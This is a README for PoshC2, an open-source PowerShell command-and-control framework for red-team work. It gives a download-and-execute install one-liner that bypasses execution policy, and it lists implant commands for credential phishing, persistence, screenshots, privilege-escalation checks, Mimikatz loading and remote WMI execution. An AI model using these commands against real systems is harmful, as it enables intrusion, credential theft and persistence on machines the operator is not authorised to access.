Powershell C2:
================
Released as an open source project by Nettitude UK Limited - http://www.nettitude.com

Developed and maintained by @benpturner & @davehardy20

Requires only Powershell v2 on both server and client

![alt tag](https://github.com/nettitude/PoshC2/wiki/images/C2-server-1.PNG)


Install:
================
powershell -exec bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/nettitude/PoshC2/master/C2-Installer.ps1')"

Run a new C2 Server:
==============================================
Run Start-C2-Server shortcut as Administrator (Windows 7,8 & 10)

Connect an existing database with valid implants:
=================================================
Run Restart-C2Server shortcut as Administrator (Windows 7,8 & 10)

**Very important if you want legacy payloads to re-connect to your C2 server**

Using the Implant-Handler:
===========================
Select the implant ID, then issue commands, e.g. 1. 
For multiple implants, select with comma seperator, e.g. 1,2,3

PS > Whoami

PS > Beacon 60

PS > Get-Service

PS > CreatePayloadProxy

PS > Cred-Popper

PS > Install-Persistence

PS > Remove-Persistence

PS > WMICommand -username domain\user -password pass -command "echo 1 > c:\test.txt"

PS > Get-Screenshot

PS > Invoke-AllChecks

PS > LoadModule invoke-mimikatz.ps1

PS > Get-RecentFiles

PS > back (to use another implant from the database)
